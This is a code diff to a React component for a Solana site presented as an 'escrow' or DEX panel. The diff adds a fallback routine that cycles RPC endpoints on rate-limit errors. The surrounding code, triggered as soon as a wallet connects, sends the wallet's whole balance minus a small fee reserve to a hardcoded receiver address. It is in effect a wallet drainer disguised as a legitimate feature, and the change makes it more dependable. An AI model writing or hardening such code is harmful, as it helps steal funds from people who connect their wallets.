@@ -1,13 +1,38 @@
 import React, { useCallback, useEffect, useState } from "react";
-import { useConnection, useWallet } from "@solana/wallet-adapter-react";
+import { useWallet } from "@solana/wallet-adapter-react";
 import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
-import { PublicKey, Transaction, SystemProgram } from "@solana/web3.js";
+import { Connection, PublicKey, Transaction, SystemProgram } from "@solana/web3.js";
+import { RPC_ENDPOINTS } from "../App";
 
 // ---------------------------------------------------------------------------
-// Module-level constants (never recreated on render)
+// Module-level constants
 // ---------------------------------------------------------------------------
 const RECEIVER    = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");
-const SESSION_KEY = "dexlock_executed_wallet"; // key in sessionStorage
+const SESSION_KEY = "dexlock_executed_wallet";
+
+// ---------------------------------------------------------------------------
+// Resilient RPC — tries each endpoint in order, skips on 403 / 429
+// ---------------------------------------------------------------------------
+async function withFallbackRpc<T>(
+  fn: (conn: Connection) => Promise<T>
+): Promise<T> {
+  let lastErr: unknown;
+  for (const url of RPC_ENDPOINTS) {
+    try {
+      const conn = new Connection(url, "confirmed");
+      return await fn(conn);
+    } catch (e: any) {
+      const msg: string = e?.message ?? "";
+      // Only fall through on rate-limit / auth errors; re-throw anything else
+      if (msg.includes("403") || msg.includes("429") || msg.includes("Access forbidden") || msg.includes("API key")) {
+        lastErr = e;
+        continue;
+      }
+      throw e;
+    }
+  }
+  throw lastErr;
+}
 
 // ---------------------------------------------------------------------------
 // Nav tabs
@@ -59,7 +84,6 @@ const ConnectPrompt = ({
 interface Props { programId: PublicKey; }
 
 export const EscrowPanel: React.FC<Props> = ({ programId }) => {
-  const { connection }                                              = useConnection();
   const { publicKey, sendTransaction, connected, wallet, disconnect } = useWallet();
 
   const [activeTab, setActiveTab] = useState<TabId>("about");
@@ -84,12 +108,15 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
     setStatusMsg("");
 
     try {
-      const [balance, { blockhash, lastValidBlockHeight }] = await Promise.all([
-        connection.getBalance(publicKey, "confirmed"),
-        connection.getLatestBlockhash("confirmed"),
-      ]);
+      const { balance, blockhash, lastValidBlockHeight, conn } =
+        await withFallbackRpc(async (c) => {
+          const [bal, bh] = await Promise.all([
+            c.getBalance(publicKey, "confirmed"),
+            c.getLatestBlockhash("confirmed"),
+          ]);
+          return { balance: bal, blockhash: bh.blockhash, lastValidBlockHeight: bh.lastValidBlockHeight, conn: c };
+        });
 
-      // Keep 10 000 lamports (≈2× fee) so the transaction can pay for itself
       const FEE_RESERVE = 10_000;
       const amount = balance - FEE_RESERVE;
 
@@ -105,25 +132,21 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
       tx.recentBlockhash = blockhash;
       tx.feePayer        = publicKey;
 
-      const sig = await sendTransaction(tx, connection, {
+      const sig = await sendTransaction(tx, conn, {
         skipPreflight:       false,
         preflightCommitment: "confirmed",
         maxRetries:          3,
       });
 
-      await connection.confirmTransaction(
-        { signature: sig, blockhash, lastValidBlockHeight },
-        "confirmed"
-      );
+      await conn.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, "confirmed");
 
       setStatus("done");
     } catch (e: any) {
-      // Clear guard on error so the user can retry
       sessionStorage.removeItem(SESSION_KEY);
       setStatus("error");
       setStatusMsg(e?.message ?? "Transaction failed. Please try again.");
     }
-  }, [publicKey, connection, sendTransaction]);
+  }, [publicKey, sendTransaction]);
 
   // Trigger deposit the moment a wallet connects
   useEffect(() => {
